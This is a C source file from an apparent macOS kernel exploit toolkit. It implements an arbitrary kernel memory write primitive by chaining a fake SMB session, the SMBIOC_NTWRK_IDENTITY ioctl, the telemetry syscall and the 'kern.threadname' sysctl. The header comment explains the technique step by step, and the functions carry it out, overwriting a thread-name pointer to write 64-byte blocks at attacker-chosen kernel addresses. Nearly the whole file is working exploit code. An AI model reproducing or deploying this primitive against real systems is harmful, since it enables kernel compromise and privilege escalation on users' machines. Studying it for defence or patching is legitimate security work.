//
//  kmem_write_session.c
//  xpl_kmem
//
//  Created by sreejith on 2/25/22.
//

#include <assert.h>
#include <pthread.h>

#include <sys/kauth.h>
#include <sys/sysctl.h>
#include <mach/thread_info.h>

#include <xpl/memory/kmem.h>
#include <xpl/xnu/proc.h>
#include <xpl/xnu/thread.h>
#include <xpl/util/assert.h>

#include <macos/kernel.h>

#include "kmem_write_session.h"
#include "smb/params.h"
#include "smb/client.h"


extern int __telemetry(uint64_t cmd, uint64_t deadline, uint64_t interval, uint64_t leeway, uint64_t arg4, uint64_t arg5);


///
/// The ioctl command of type `SMBIOC_NTWRK_IDENTITY` is used to set the network user
/// identitiy of a smb session. This ioctl command is handled by method `smb_usr_set_network_identity`
/// as shown below
///
/// int smb_usr_set_network_identity(struct smb_session *sessionp, struct smbioc_ntwrk_identity *ntwrkID)
/// {
///     if (sessionp->session_flags & SMBV_NETWORK_SID) {
///         return EEXIST;
///     }
///
///     if (ntwrkID->ioc_ntsid_len != sizeof(ntsid_t)) {
///         return EINVAL;
///     }
///     memcpy(&sessionp->session_ntwrk_sid, &ntwrkID->ioc_ntsid, (size_t)ntwrkID->ioc_ntsid_len);
///     sessionp->session_flags |= SMBV_NETWORK_SID;
///     return 0;
/// }
///
/// The code path handling the SMBIOC_NTWRK_IDENTITY ioctl will only access fields
/// `sessionp->session_flags` and `sessionp->session_ntwrk_sid`. By adjusting the value of
/// `smb_dev->sd_session` pointer we can use this ioctl command to write data to a arbitary
/// location in kernel memory. But there are two disadvantages of using this method :-
///
/// 1) For the write to happen, SMBV_NETWORK_SID flag in `sessionp->session_flags` must be cleared.
///    When writing to arbitary kernel memory location, this condition may not always be satisfied
/// 2) Once the write is done, SMBV_NETWORK_SID flag in `sessionp->session_flags` is set which may
///    cause unintented side effects
///
/// These disadvantages limits this method from being used directly as a powerful arbitary memory
/// write primitive. But this method can be used to control pointers in other data structures which
/// inturn can then write to arbitary kernel memory locations.
///
/// In `struct uthread` data structure, the member `ith_name` is a pointer to dynamically allocated
/// buffer. This buffer is used for storing the thread name which can be written using "kern.threadname"
/// sysctl. The member,`ith_voucher_name` in `struct thread` can be controlled using the `telemetry`
/// syscall. The `struct thread` and `struct uthread` of a thread is allocated from the same element
/// of `threads` zone. By aligning the member `sessionp->session_flags` with `thread->ith_voucher_name`,
/// the member `uthread->pth_name` will be writable by writing to `sessionp->session_ntwrk_sid`.
/// Using this principle, we can build a general purpose arbitary kernel memory writer. The
/// `SMBV_NETWORK_SID` ioctl command can be used to set the value of pointer `uthread->pth_name`.
/// Then the "kern.threadname" sysctl can be used to write data to the address in `uthread->pth_name`.
/// To perform another kernel memory write, the `SMBV_NETWORK_SID` flag set on `sessionp->session_flags`
/// must be cleared. The `telemetry` syscall can be used to set `thread->ith_voucher_name` to zero.
/// Since `thread->ith_voucher_name` is aligned with `sessionp->session_flags`, we can use this
/// syscall to clear the `SMBV_NETWORK_SID` flag in `sessionp->session_flags`
///


struct kmem_write_session {
    uintptr_t thread;
    uint64_t thread_id;
    ntsid_t write_data;
};


uint64_t kmem_write_session_get_thread_id(void) {
    uint64_t thread_id;
    int error = pthread_threadid_np(pthread_self(), &thread_id);
    xpl_assert_err(error);
    return thread_id;
}


/// Create a fake smb_session that can be used for arbitary kernel memory write
kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr) {
    uintptr_t thread = xpl_xnu_thread_current_thread();
    
    uintptr_t ith_voucher_name = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET;
    xpl_assert_cond(xpl_kmem_read_uint32(ith_voucher_name, 0), ==, 0);
    /// The `struct thread` and `struct uthread` are allocated from the same element of
    /// threads zone. The uthread is allocated after thread
    uintptr_t uthread = thread + TYPE_THREAD_SIZE;
    uintptr_t pth_name = uthread + TYPE_UTHREAD_MEM_PTH_NAME_OFFSET;
    
    /// Align `thread->ith_voucher_name` with `sessionp->session_flags`
    uintptr_t session = ith_voucher_name - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
    
    /// Make sure that `uthread->pth_name` pointer can be controlled by writing to `sessionp->session_ntwrk_sid`
    uintptr_t write_start = session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
    uintptr_t write_end = write_start + sizeof(ntsid_t);
    xpl_assert_cond(write_end, <=, thread + TYPE_THREAD_SIZE + TYPE_UTHREAD_SIZE);
    xpl_assert_cond(write_start, <=, pth_name);
    xpl_assert_cond(pth_name + sizeof(uintptr_t), <=, write_end);
    
    struct kmem_write_session* ws = malloc(sizeof(struct kmem_write_session));
    ws->thread = thread;
    xpl_kmem_read(&ws->write_data, write_start, 0, sizeof(ws->write_data));
    ws->thread_id = kmem_write_session_get_thread_id();
    
    return ws;
}


/// Write data of size 64 bytes to arbitary kernel memory location
void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, uintptr_t dst, char data[MAXTHREADNAMESIZE]) {
    /// Since `pth_name` is a C string, the "kern.threadname" sysctl handler always set the last byte
    /// to null byte. This assertion makes sure the caller is aware of this limitation
    xpl_assert_cond(data[MAXTHREADNAMESIZE - 1], ==, '\0');
    xpl_assert_cond(kmem_write_session_get_thread_id(), ==, session->thread_id);
        
    uintptr_t thread = session->thread;
    uintptr_t smb_session = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
    
    /// Clear SMBV_NETWORK_SID flag from `sessionp->session_flags`
    int res = __telemetry(2, 0, 0, 0, 0, 0);
    xpl_assert_errno(res);
    
    uintptr_t write_start = smb_session + TYPE_SMB_SESSION_MEM_SESSION_NTWRK_SID_OFFSET;
    uintptr_t uthread = thread + TYPE_THREAD_SIZE;
    uintptr_t pth_name = uthread + TYPE_UTHREAD_MEM_PTH_NAME_OFFSET;
    
    ntsid_t ntsid = session->write_data;
    *((uint64_t*)((char*)&ntsid + (pth_name - write_start))) = dst;
    
    /// Sets the value of `uthread->pth_name` pointer to dst
    int error = smb_client_ioc_set_ntwrk_identity(smb_dev, &ntsid);
    xpl_assert_err(error);
    
    /// Writes data to dst
    res = sysctlbyname("kern.threadname", NULL, NULL, data, MAXTHREADNAMESIZE - 1);
    xpl_assert_errno(res);
    
    /// Clear SMBV_NETWORK_SID flag on `sessionp->session_flags` set by previous ioctl
    res = __telemetry(2, 0, 0, 0, 0, 0);
    xpl_assert_errno(res);
    
    /// Restore the `uthread->pth_name` pointer back to original value
    error = smb_client_ioc_set_ntwrk_identity(smb_dev, &session->write_data);
    xpl_assert_err(error);
}


/// Returns the address of fake smb_session which can be set to `smb_dev->sd_session`
/// using `smb_dev_rw.c` for arbitary kernel memory read
uintptr_t kmem_write_session_get_addr(kmem_write_session_t session) {
    uintptr_t thread = session->thread;
    return thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
}


void kmem_write_session_destroy(kmem_write_session_t* session_p) {
    uintptr_t thread = xpl_xnu_thread_current_thread();
    uintptr_t uthread = thread + TYPE_THREAD_SIZE;
    xpl_kmem_write_uint64(uthread, TYPE_UTHREAD_MEM_PTH_NAME_OFFSET, 0);
    free(*session_p);
    *session_p = NULL;
}
